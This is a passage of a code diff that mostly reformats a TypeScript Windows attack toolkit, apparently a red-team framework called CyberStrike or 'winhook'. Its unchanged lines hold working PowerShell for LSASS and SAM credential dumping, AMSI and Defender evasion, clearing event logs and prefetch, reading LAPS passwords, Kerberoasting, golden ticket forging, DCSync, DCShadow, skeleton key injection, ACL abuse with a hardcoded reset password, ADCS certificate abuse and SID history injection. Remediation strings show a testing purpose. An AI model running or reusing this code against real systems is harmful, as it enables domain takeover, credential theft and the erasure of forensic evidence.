@@ -62,7 +62,7 @@ const PROGRAMS = {
       "Remove CyberStrike artifacts — clear Security/System/Application event logs, remove scheduled tasks, restore AMSI/ETW patches, delete temp files. ALWAYS run before leaving a target",
     args: "",
   },
-ad_enum: {
+  ad_enum: {
     description:
       "Comprehensive Active Directory enumeration — domain info, forest/trust relationships, all users (enabled/disabled/admincount/password-age/last-logon), privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Backup Operators, Account Operators, DnsAdmins, Server Operators), computers, OUs, SPNs (kerberoastable), AdminSDHolder protected objects, fine-grained password policies, KRBTGT account info, and domain controller list",
     args: "[--target DOMAIN] [--ldap-filter FILTER] [--users-only] [--groups-only] [--computers-only] [--spns-only]",
@@ -285,12 +285,25 @@ ad_enum: {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -299,7 +312,11 @@ async function run(cmd: string, args: string[], timeout: number): Promise<{ stdo
 }
 
 function ps(script: string, timeout: number) {
-  return run("powershell.exe", ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script], timeout)
+  return run(
+    "powershell.exe",
+    ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
+    timeout,
+  )
 }
 
 function argVal(args: string[], flag: string): string | undefined {
@@ -322,7 +339,10 @@ async function lsassDump(args: string[], timeout: number): Promise<HookResult> {
   const privCheck = await ps(`(whoami /priv | Select-String SeDebugPrivilege) -ne $null`, timeout)
   output.push(`[*] SeDebugPrivilege: ${privCheck.stdout.trim() === "True" ? "AVAILABLE" : "NOT AVAILABLE"}`)
 
-  const pplCheck = await ps(`(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL`, timeout)
+  const pplCheck = await ps(
+    `(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL`,
+    timeout,
+  )
   const isPPL = pplCheck.stdout.trim() === "1"
   output.push(`[*] LSASS PPL: ${isPPL ? "ENABLED (dump may fail)" : "DISABLED"}`)
 
@@ -437,7 +457,9 @@ async function samDump(args: string[], timeout: number): Promise<HookResult> {
     }
   }
 
-  output.push(`\n[*] Crack with: impacket-secretsdump -sam ${outdir}\\SAM -system ${outdir}\\SYSTEM -security ${outdir}\\SECURITY LOCAL`)
+  output.push(
+    `\n[*] Crack with: impacket-secretsdump -sam ${outdir}\\SAM -system ${outdir}\\SYSTEM -security ${outdir}\\SECURITY LOCAL`,
+  )
 
   return { output: output.join("\n"), findings }
 }
@@ -723,7 +745,7 @@ $global:events | ForEach-Object { Write-Output $_ }
   if (monitor.exitCode !== 0) {
     output.push("[!] WMI process trace failed, falling back to tasklist polling...")
     const baseline = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
-    await new Promise(r => setTimeout(r, Math.min(duration, 10) * 1000))
+    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
     const current = await ps("Get-Process | Select-Object Id, ProcessName | ConvertTo-Json", timeout)
     output.push("[+] Process snapshot comparison completed")
     output.push(`    Baseline: ${baseline.stdout.length} bytes`)
@@ -738,17 +760,20 @@ async function etwNetwork(args: string[], timeout: number): Promise<HookResult> 
   const findings: Finding[] = []
   const output: string[] = [`[*] Monitoring network connections for ${duration}s...\n`]
 
-  const baseline = await ps("Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json", timeout)
+  const baseline = await ps(
+    "Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess | ConvertTo-Json",
+    timeout,
+  )
   if (baseline.exitCode === 0) {
     const conns = JSON.parse(baseline.stdout || "[]") as Array<Record<string, string | number>>
     const arr = Array.isArray(conns) ? conns : [conns]
     output.push(`[+] Current TCP connections: ${arr.length}`)
-    const established = arr.filter(c => c.State === "Established" || c.State === 4)
+    const established = arr.filter((c) => c.State === "Established" || c.State === 4)
     output.push(`[+] Established: ${established.length}`)
     for (const c of established.slice(0, 50)) {
       output.push(`    ${c.LocalAddress}:${c.LocalPort} → ${c.RemoteAddress}:${c.RemotePort} (PID: ${c.OwningProcess})`)
     }
-    const listening = arr.filter(c => c.State === "Listen" || c.State === 2)
+    const listening = arr.filter((c) => c.State === "Listen" || c.State === 2)
     output.push(`\n[+] Listening: ${listening.length}`)
     for (const c of listening.slice(0, 30)) {
       output.push(`    ${c.LocalAddress}:${c.LocalPort} (PID: ${c.OwningProcess})`)
@@ -757,8 +782,11 @@ async function etwNetwork(args: string[], timeout: number): Promise<HookResult> 
 
   if (duration > 0) {
     output.push(`\n[*] Polling for new connections over ${Math.min(duration, 30)}s...`)
-    await new Promise(r => setTimeout(r, Math.min(duration, 10) * 1000))
-    const after = await ps("Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json", timeout)
+    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))
+    const after = await ps(
+      "Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' } | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json",
+      timeout,
+    )
     if (after.exitCode === 0) {
       output.push("[+] Post-monitoring snapshot captured")
     }
@@ -898,7 +926,10 @@ Write-Output "CLR_LOADED:$h"
     }
   }
 
-  const verify = await ps(`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)`, timeout)
+  const verify = await ps(
+    `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)`,
+    timeout,
+  )
   output.push(`\n[*] AMSI status check — amsiInitFailed: ${verify.stdout.trim()}`)
 
   return { output: output.join("\n"), findings }
@@ -1007,7 +1038,10 @@ async function defenderExclude(args: string[], timeout: number): Promise<HookRes
     output.push("[*] Requires Administrator privileges")
   }
 
-  const defenderStatus = await ps("Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AntispywareEnabled, BehaviorMonitorEnabled | ConvertTo-Json", timeout)
+  const defenderStatus = await ps(
+    "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AntispywareEnabled, BehaviorMonitorEnabled | ConvertTo-Json",
+    timeout,
+  )
   if (defenderStatus.exitCode === 0) {
     output.push(`\n[*] Defender status:\n${defenderStatus.stdout.trim()}`)
   }
@@ -1032,7 +1066,10 @@ async function cleanupWin(_args: string[], timeout: number): Promise<HookResult>
     }
   }
 
-  const tasks = await ps(`Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*cyberstrike*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`, timeout)
+  const tasks = await ps(
+    `Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*cyberstrike*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`,
+    timeout,
+  )
   if (tasks.exitCode === 0 && tasks.stdout.trim()) {
     for (const t of tasks.stdout.trim().split("\n").filter(Boolean)) {
       output.push(`[+] Removed scheduled task: ${t.trim()}`)
@@ -1040,7 +1077,8 @@ async function cleanupWin(_args: string[], timeout: number): Promise<HookResult>
     }
   }
 
-  const tmpClean = await ps(`
+  const tmpClean = await ps(
+    `
 $patterns = @("cs-*", "cyberstrike-*")
 $dirs = @($env:TEMP, "C:\\Windows\\Temp")
 foreach ($dir in $dirs) {
@@ -1051,7 +1089,9 @@ foreach ($dir in $dirs) {
         }
     }
 }
-`, timeout)
+`,
+    timeout,
+  )
   if (tmpClean.exitCode === 0 && tmpClean.stdout.trim()) {
     for (const f of tmpClean.stdout.trim().split("\n").filter(Boolean)) {
       output.push(`[+] Removed temp file: ${f.trim()}`)
@@ -1059,14 +1099,17 @@ foreach ($dir in $dirs) {
     }
   }
 
-  const defExclusions = await ps(`
+  const defExclusions = await ps(
+    `
 $prefs = Get-MpPreference
 $csExclusions = $prefs.ExclusionPath | Where-Object { $_ -like '*cs-*' -or $_ -like '*cyberstrike*' }
 foreach ($e in $csExclusions) {
     Remove-MpPreference -ExclusionPath $e
     Write-Output $e
 }
-`, timeout)
+`,
+    timeout,
+  )
   if (defExclusions.exitCode === 0 && defExclusions.stdout.trim()) {
     for (const e of defExclusions.stdout.trim().split("\n").filter(Boolean)) {
       output.push(`[+] Removed Defender exclusion: ${e.trim()}`)
@@ -1074,7 +1117,10 @@ foreach ($e in $csExclusions) {
     }
   }
 
-  const prefetch = await ps(`Remove-Item "C:\\Windows\\Prefetch\\*cyberstrike*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`, timeout)
+  const prefetch = await ps(
+    `Remove-Item "C:\\Windows\\Prefetch\\*cyberstrike*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`,
+    timeout,
+  )
   if (prefetch.exitCode === 0) {
     output.push("[+] Cleared prefetch entries")
     cleaned++
@@ -1098,7 +1144,6 @@ foreach ($e in $csExclusions) {
   return { output: output.join("\n"), findings }
 }
 
-
 // ── AD Enumeration ──
 
 async function adEnum(args: string[], timeout: number): Promise<HookResult> {
@@ -1111,7 +1156,9 @@ async function adEnum(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["[*] Active Directory enumeration...\n"]
 
-  const domainTarget = target ? `"LDAP://${target}"` : `"LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name)"`
+  const domainTarget = target
+    ? `"LDAP://${target}"`
+    : `"LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name)"`
 
   const script = `
 $ErrorActionPreference = 'SilentlyContinue'
@@ -1146,7 +1193,10 @@ foreach ($t in $trusts) {
   Write-Output "  $($t.TargetName) | Direction=$($t.TrustDirection) | Type=$($t.TrustType)"
 }
 
-${usersOnly || groupsOnly || computersOnly || spnsOnly ? "" : `
+${
+  usersOnly || groupsOnly || computersOnly || spnsOnly
+    ? ""
+    : `
 $searcher.Filter = "(objectClass=organizationalUnit)"
 $searcher.PropertiesToLoad.AddRange(@("name","distinguishedName"))
 $ous = $searcher.FindAll()
@@ -1155,9 +1205,13 @@ foreach ($ou in $ous) {
   Write-Output "  $($ou.Properties['distinguishedname'][0])"
 }
 $searcher.PropertiesToLoad.Clear()
-`}
+`
+}
 
-${groupsOnly || computersOnly || spnsOnly ? "" : `
+${
+  groupsOnly || computersOnly || spnsOnly
+    ? ""
+    : `
 Write-Output "\\n=== USERS ==="
 $searcher.Filter = ${customFilter ? `"${customFilter}"` : '"(&(objectCategory=person)(objectClass=user))"'}
 $searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","useraccountcontrol","pwdlastset","lastlogon","admincount","memberof","serviceprincipalname","description","mail"))
@@ -1187,9 +1241,13 @@ foreach ($u in $users) {
 }
 Write-Output "  TOTAL: $($users.Count) users | Enabled=$enabled | Disabled=$disabled | AdminCount=$adminCount | NoPreAuth=$noPreAuth | PwdNeverExpires=$neverExpire"
 $searcher.PropertiesToLoad.Clear()
-`}
+`
+}
 
-${usersOnly || computersOnly || spnsOnly ? "" : `
+${
+  usersOnly || computersOnly || spnsOnly
+    ? ""
+    : `
 Write-Output "\\n=== PRIVILEGED GROUPS ==="
 $privGroups = @('Domain Admins','Enterprise Admins','Schema Admins','Administrators','Backup Operators','Account Operators','Server Operators','DnsAdmins','Group Policy Creator Owners','Print Operators','Remote Desktop Users','Cert Publishers')
 foreach ($gName in $privGroups) {
@@ -1203,9 +1261,13 @@ foreach ($gName in $privGroups) {
   }
   $searcher.PropertiesToLoad.Clear()
 }
-`}
+`
+}
 
-${usersOnly || groupsOnly || spnsOnly ? "" : `
+${
+  usersOnly || groupsOnly || spnsOnly
+    ? ""
+    : `
 Write-Output "\\n=== COMPUTERS ==="
 $searcher.Filter = "(objectClass=computer)"
 $searcher.PropertiesToLoad.AddRange(@("cn","operatingsystem","operatingsystemversion","lastlogon","dnshostname"))
@@ -1220,9 +1282,13 @@ foreach ($c in $computers) {
 }
 Write-Output "  TOTAL: $($computers.Count) | OS Distribution: $(($osCounts.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ', ')"
 $searcher.PropertiesToLoad.Clear()
-`}
+`
+}
 
-${usersOnly || groupsOnly || computersOnly ? "" : `
+${
+  usersOnly || groupsOnly || computersOnly
+    ? ""
+    : `
 Write-Output "\\n=== SPN ACCOUNTS (Kerberoastable) ==="
 $searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
 $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","admincount","pwdlastset","memberof"))
@@ -1234,7 +1300,8 @@ foreach ($s in $spnUsers) {
 }
 Write-Output "  TOTAL Kerberoastable: $($spnUsers.Count)"
 $searcher.PropertiesToLoad.Clear()
-`}
+`
+}
 
 Write-Output "\\n=== ADMINSDHOLDER PROTECTED ==="
 $searcher.Filter = "(adminCount=1)"
@@ -1571,7 +1638,10 @@ if ($dangerousAcls.Count -gt 0) {
       status: "COLLECTED",
       resource: `file://${outfile}`,
       title: `BloodHound data collected: ${aclCountMatch[1]} ACLs`,
-      details: result.stdout.split("\n").filter(l => l.match(/^(GROUPS|ACLS|SESSIONS|LOCALADMINS|TRUSTS)=/)).join(", "),
+      details: result.stdout
+        .split("\n")
+        .filter((l) => l.match(/^(GROUPS|ACLS|SESSIONS|LOCALADMINS|TRUSTS)=/))
+        .join(", "),
       remediation: "Analyze the JSON data for attack paths",
     })
   }
@@ -1619,7 +1689,9 @@ $winLapsSchema = $schemaSearcher.FindOne()
 Write-Output "  Legacy LAPS schema: $(if($legacySchema){'PRESENT'}else{'NOT FOUND'})"
 Write-Output "  Windows LAPS schema: $(if($winLapsSchema){'PRESENT'}else{'NOT FOUND'})"
 
-${!winLapsOnly ? `
+${
+  !winLapsOnly
+    ? `
 # === LEGACY LAPS (ms-Mcs-AdmPwd) ===
 Write-Output "\\n=== LEGACY LAPS PASSWORDS ==="
 $filter = if ('${computer || ""}') { "(&(objectClass=computer)(cn=${computer})(ms-Mcs-AdmPwd=*))" } else { "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" }
@@ -1638,9 +1710,13 @@ foreach ($r in $results) {
 if ($legacyCount -eq 0) { Write-Output "  No readable legacy LAPS passwords found" }
 Write-Output "LEGACY_COUNT=$legacyCount"
 $searcher.PropertiesToLoad.Clear()
-` : ""}
+`
+    : ""
+}
 
-${!legacyOnly ? `
+${
+  !legacyOnly
+    ? `
 # === WINDOWS LAPS (msLAPS-Password) ===
 Write-Output "\\n=== WINDOWS LAPS PASSWORDS ==="
 $filter = if ('${computer || ""}') { "(&(objectClass=computer)(cn=${computer})(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))" } else { "(&(objectClass=computer)(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))" }
@@ -1660,7 +1736,9 @@ foreach ($r in $results) {
 if ($winLapsCount -eq 0) { Write-Output "  No readable Windows LAPS passwords found" }
 Write-Output "WINLAPS_COUNT=$winLapsCount"
 $searcher.PropertiesToLoad.Clear()
-` : ""}
+`
+    : ""
+}
 
 # Check who can read LAPS attributes
 Write-Output "\\n=== LAPS READ PERMISSIONS ==="
@@ -2072,7 +2150,6 @@ try {
   return { output: output.join("\n"), findings }
 }
 
-
 // ── Kerberos Attacks ──
 
 async function kerberoast(args: string[], timeout: number): Promise<HookResult> {
@@ -2340,7 +2417,11 @@ async function goldenTicket(args: string[], timeout: number): Promise<HookResult
   const output: string[] = ["[*] Golden Ticket — forging Kerberos TGT...\n"]
 
   if (!krbtgtHash || !domain || !sid) {
-    return { output: "[!] Required: --krbtgt-hash HASH --domain DOMAIN --sid SID\n\nGet krbtgt hash via: winhook dcsync --user krbtgt", findings }
+    return {
+      output:
+        "[!] Required: --krbtgt-hash HASH --domain DOMAIN --sid SID\n\nGet krbtgt hash via: winhook dcsync --user krbtgt",
+      findings,
+    }
   }
 
   const script = `
@@ -2685,7 +2766,9 @@ elseif ($delegationType -eq "rbcd") {
         Write-Output ""
     }
 
-    ${exploit && target ? `
+    ${
+      exploit && target
+        ? `
     # RBCD exploitation: set msDS-AllowedToActOnBehalfOfOtherIdentity on target
     $targetComputer = "${target}"
     Write-Output "[!] Attempting RBCD attack on $targetComputer..."
@@ -2709,13 +2792,15 @@ elseif ($delegationType -eq "rbcd") {
     } catch {
         Write-Output "[!] Failed to set RBCD: $_ (need write access to target computer object)"
     }
-    ` : `
+    `
+        : `
     Write-Output "[*] To exploit RBCD:"
     Write-Output "    1. Create/compromise a machine account (MachineAccountQuota)"
     Write-Output "    2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target"
     Write-Output "    3. Use S4U2Self + S4U2Proxy to impersonate Domain Admin"
     Write-Output "    4. Use: winhook delegation_abuse --type rbcd --target TARGET --exploit"
-    `}
+    `
+    }
 }
 `
   const result = await ps(script, timeout)
@@ -2732,9 +2817,10 @@ elseif ($delegationType -eq "rbcd") {
         resource: `kerberos://delegation/${type}`,
         title: `${type} delegation: ${count} objects found`,
         details: `${count} objects with ${type} delegation configured`,
-        remediation: type === "unconstrained"
-          ? "Replace unconstrained delegation with constrained delegation or RBCD"
-          : "Review delegation targets, ensure least privilege",
+        remediation:
+          type === "unconstrained"
+            ? "Replace unconstrained delegation with constrained delegation or RBCD"
+            : "Review delegation targets, ensure least privilege",
       })
     }
   }
@@ -3036,7 +3122,9 @@ elseif ($action -eq "export") {
     [KerberosTickets]::LsaDeregisterLogonProcess($handle)
 }
 elseif ($action -eq "import") {
-    ${ticketPath ? `
+    ${
+      ticketPath
+        ? `
     $kirbiPath = "${ticketPath}"
     if (!(Test-Path $kirbiPath)) {
         Write-Output "[!] Ticket file not found: $kirbiPath"
@@ -3079,9 +3167,11 @@ elseif ($action -eq "import") {
         Write-Output "[!] Import failed: status=0x$($status.ToString('X8')) protocol=0x$($protocolStatus.ToString('X8'))"
         Write-Output "[*] Try: mimikatz kerberos::ptt $kirbiPath"
     }
-    ` : `
+    `
+        : `
     Write-Output "[!] Required: --ticket PATH (path to .kirbi file)"
-    `}
+    `
+    }
 }
 `
   const result = await ps(script, timeout)
@@ -3279,7 +3369,7 @@ function DCSync-User {
     $output -join "\`n"
 }
 
-${domain ? `$domainParam = "${domain}"` : '$domainParam = $null'}
+${domain ? `$domainParam = "${domain}"` : "$domainParam = $null"}
 $domainDN = Get-DomainDN -Domain $domainParam
 
 # Check replication rights first
@@ -3287,7 +3377,9 @@ $rights = [DCSyncHelper]::CheckReplRights($domainDN)
 Write-Output "[*] Accounts with replication rights:"
 Write-Output $rights
 
-${all ? `
+${
+  all
+    ? `
 # DCSync all privileged accounts
 $privileged = @('krbtgt','Administrator')
 $searcher = [System.DirectoryServices.DirectorySearcher]::new()
@@ -3302,9 +3394,11 @@ foreach ($u in $privileged) {
     Write-Output "=== $u ==="
     DCSync-User -Username $u -DomainDN $domainDN
 }
-` : `
-DCSync-User -Username "${user || 'krbtgt'}" -DomainDN $domainDN
-`}
+`
+    : `
+DCSync-User -Username "${user || "krbtgt"}" -DomainDN $domainDN
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -3319,7 +3413,8 @@ DCSync-User -Username "${user || 'krbtgt'}" -DomainDN $domainDN
     resource: `ad://${domain || "current-domain"}`,
     title: `DCSync replication ${all ? "(all privileged)" : `for ${user || "krbtgt"}`}`,
     details: result.stdout.substring(0, 500),
-    remediation: "Audit and remove Replicating Directory Changes rights from non-DC accounts. Monitor DRS replication events (4662, 4624 type 3).",
+    remediation:
+      "Audit and remove Replicating Directory Changes rights from non-DC accounts. Monitor DRS replication events (4662, 4624 type 3).",
   })
 
   return { output: output.join("\n"), findings }
@@ -3346,7 +3441,7 @@ function Get-DomainDN {
     return ([ADSI]"LDAP://RootDSE").defaultNamingContext
 }
 
-${domain ? `$domainDN = Get-DomainDN -Domain "${domain}"` : '$domainDN = Get-DomainDN'}
+${domain ? `$domainDN = Get-DomainDN -Domain "${domain}"` : "$domainDN = Get-DomainDN"}
 $hostname = [System.Net.Dns]::GetHostName()
 $siteName = (nltest /dsgetsite 2>&1 | Select-Object -First 1).Trim()
 
@@ -3451,7 +3546,8 @@ if (-not $existing) {
     resource: `ad://${target}`,
     title: `DCShadow: ${attribute}=${value} on ${target}`,
     details: `Rogue DC used to push attribute change via replication`,
-    remediation: "Monitor for new nTDSDSA object creation in Sites. Alert on 4742 (computer account modified) and replication from unknown sources.",
+    remediation:
+      "Monitor for new nTDSDSA object creation in Sites. Alert on 4742 (computer account modified) and replication from unknown sources.",
   })
 
   return { output: output.join("\n"), findings }
@@ -3578,7 +3674,7 @@ Invoke-Command -Session $session -ScriptBlock {
 Remove-PSSession $session
 Write-Output ""
 Write-Output "[+] Skeleton key injection complete"
-Write-Output "[*] Test: runas /netonly /user:${dc.split('.')[0] || 'DOMAIN'}\\Administrator cmd"
+Write-Output "[*] Test: runas /netonly /user:${dc.split(".")[0] || "DOMAIN"}\\Administrator cmd"
 Write-Output "    Use password: ${password}"
 `
 
@@ -3594,7 +3690,8 @@ Write-Output "    Use password: ${password}"
     resource: `dc://${dc}`,
     title: `Skeleton key injected on ${dc}`,
     details: `Master password set — all accounts accept this password alongside real passwords`,
-    remediation: "Reboot DC to clear. Monitor for LSASS memory writes. Enable Credential Guard. Use Protected Users group.",
+    remediation:
+      "Reboot DC to clear. Monitor for LSASS memory writes. Enable Credential Guard. Use Protected Users group.",
   })
 
   return { output: output.join("\n"), findings }
@@ -3635,7 +3732,9 @@ $genericRights = @{
     'GenericRead'    = 131220    # 0x20094
 }
 
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 # Enumerate dangerous ACLs
 Write-Output "[*] Scanning for dangerous ACLs..."
 
@@ -3742,10 +3841,11 @@ foreach ($rule in $rootRules) {
         }
     }
 }
-` : `
+`
+    : `
 # Exploit mode
-Write-Output "[*] Exploiting ACL on target: ${target || 'unspecified'}"
-${!target ? 'Write-Output "[!] Required: --target"; exit 1' : ''}
+Write-Output "[*] Exploiting ACL on target: ${target || "unspecified"}"
+${!target ? 'Write-Output "[!] Required: --target"; exit 1' : ""}
 
 $searcher = [System.DirectoryServices.DirectorySearcher]::new()
 $searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
@@ -3761,7 +3861,9 @@ $targetEntry = $targetResult.GetDirectoryEntry()
 $targetDN = $targetResult.Properties['distinguishedName'][0]
 Write-Output "[+] Target: $targetDN"
 
-${right === "ForceChangePassword" ? `
+${
+  right === "ForceChangePassword"
+    ? `
 # Force password change
 Write-Output "[*] Forcing password change on ${target}..."
 $newPass = "CyberStr1ke!2024"
@@ -3780,7 +3882,9 @@ try {
         Write-Output "[!] LDAP password set also failed: $($_.Exception.Message)"
     }
 }
-` : right === "WriteDACL" ? `
+`
+    : right === "WriteDACL"
+      ? `
 # Grant ourselves GenericAll
 $principalName = "${principal || ""}"
 if (-not $principalName) { $principalName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name }
@@ -3796,7 +3900,9 @@ $acl.AddAccessRule($ace)
 $targetEntry.ObjectSecurity = $acl
 $targetEntry.CommitChanges()
 Write-Output "[+] GenericAll granted to $principalName on ${target}"
-` : right === "WriteOwner" ? `
+`
+      : right === "WriteOwner"
+        ? `
 # Take ownership
 $principalName = "${principal || ""}"
 if (-not $principalName) { $principalName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name }
@@ -3808,7 +3914,8 @@ $targetEntry.ObjectSecurity = $acl
 $targetEntry.CommitChanges()
 Write-Output "[+] Ownership transferred to $principalName"
 Write-Output "[*] Now grant WriteDACL to yourself, then GenericAll"
-` : `
+`
+        : `
 # GenericAll — full control, can do anything
 Write-Output "[*] Using GenericAll on ${target}..."
 Write-Output "    Options:"
@@ -3817,8 +3924,10 @@ Write-Output "      - Add to group: Add-ADGroupMember -Identity 'Domain Admins' 
 Write-Output "      - Set SPN (Kerberoast): Set-ADUser ${target} -ServicePrincipalNames @{Add='http/fake'}"
 Write-Output "      - Shadow Credentials: winhook shadow_creds --target ${target} --action add"
 Write-Output "      - Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
-`}
-`}
+`
+}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -3834,7 +3943,8 @@ Write-Output "      - Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
       resource: "ad://domain-acls",
       title: "Dangerous AD ACLs enumerated",
       details: result.stdout.substring(0, 500),
-      remediation: "Review and remove unnecessary ACLs on high-value targets. Use AdminSDHolder to protect privileged accounts.",
+      remediation:
+        "Review and remove unnecessary ACLs on high-value targets. Use AdminSDHolder to protect privileged accounts.",
     })
   } else {
     findings.push({
@@ -3869,7 +3979,9 @@ function Get-DomainDN {
 $domainDN = Get-DomainDN
 $configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
 
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 # Enumerate CAs
 Write-Output "[*] Enumerating Certificate Authorities..."
 
@@ -4023,13 +4135,14 @@ foreach ($caResult in $cas) {
         Write-Output "      ANY template can be used for impersonation via SAN"
     }
 }
-` : `
+`
+    : `
 # Exploit mode: request certificate with alternate subject
 Write-Output "[*] Exploiting ADCS..."
-${!template ? 'Write-Output "[!] Required: --template NAME"; exit 1' : ''}
-${!altname ? 'Write-Output "[!] Required: --altname USER (e.g., Administrator)"; exit 1' : ''}
+${!template ? 'Write-Output "[!] Required: --template NAME"; exit 1' : ""}
+${!altname ? 'Write-Output "[!] Required: --altname USER (e.g., Administrator)"; exit 1' : ""}
 
-$caName = "${ca || ''}"
+$caName = "${ca || ""}"
 if (-not $caName) {
     # Auto-detect CA
     $caSearcher = [System.DirectoryServices.DirectorySearcher]::new()
@@ -4105,7 +4218,8 @@ if (Test-Path $cerPath) {
 
 # Cleanup INF
 Remove-Item $infPath -Force -ErrorAction SilentlyContinue
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -4121,7 +4235,8 @@ Remove-Item $infPath -Force -ErrorAction SilentlyContinue
       resource: "ad://certificate-services",
       title: "ADCS vulnerable templates enumerated",
       details: result.stdout.substring(0, 500),
-      remediation: "Remove enrollee-supplies-subject from templates. Restrict enrollment permissions. Disable web enrollment. Audit ESC1-ESC8.",
+      remediation:
+        "Remove enrollee-supplies-subject from templates. Restrict enrollment permissions. Disable web enrollment. Audit ESC1-ESC8.",
     })
   } else {
     findings.push({
@@ -4180,17 +4295,22 @@ foreach ($key in $existingKeys) {
     Write-Output "    Key: $($key.ToString().Substring(0, [Math]::Min(100, $key.ToString().Length)))..."
 }
 
-${action === "list" ? `
+${
+  action === "list"
+    ? `
 Write-Output ""
 Write-Output "[+] Listing complete"
-` : action === "remove" ? `
+`
+    : action === "remove"
+      ? `
 Write-Output ""
 Write-Output "[*] Removing all KeyCredentialLinks..."
 $entry = $result.GetDirectoryEntry()
 $entry.Properties['msDS-KeyCredentialLink'].Clear()
 $entry.CommitChanges()
 Write-Output "[+] All KeyCredentialLinks removed from $targetName"
-` : `
+`
+      : `
 # Add shadow credential
 Write-Output ""
 Write-Output "[*] Generating self-signed certificate for PKINIT..."
@@ -4282,7 +4402,8 @@ try {
     Write-Output "    - Target has attribute locked down"
     Write-Output "    - Domain functional level < 2016"
 }
-`}
+`
+}
 `
 
   const result = await ps(script, timeout)
@@ -4297,7 +4418,8 @@ try {
     resource: `ad://${target}`,
     title: `Shadow Credentials ${action} on ${target}`,
     details: `msDS-KeyCredentialLink ${action} — PKINIT authentication without password`,
-    remediation: "Monitor changes to msDS-KeyCredentialLink (event 5136). Require DFL 2016+ and enforce credential hygiene.",
+    remediation:
+      "Monitor changes to msDS-KeyCredentialLink (event 5136). Require DFL 2016+ and enforce credential hygiene.",
   })
 
   return { output: output.join("\n"), findings }
@@ -4318,7 +4440,9 @@ function Get-DomainDN {
 }
 $domainDN = Get-DomainDN
 
-${action === "enum" ? `
+${
+  action === "enum"
+    ? `
 # Enumerate trusts
 Write-Output "[*] Enumerating domain trusts..."
 $trustSearcher = [System.DirectoryServices.DirectorySearcher]::new()
@@ -4384,10 +4508,11 @@ foreach ($obj in $sidHistResults) {
         }
     }
 }
-` : `
+`
+    : `
 # Inject SID into user's SID History
-${!target ? 'Write-Output "[!] Required: --target USER"; exit 1' : ''}
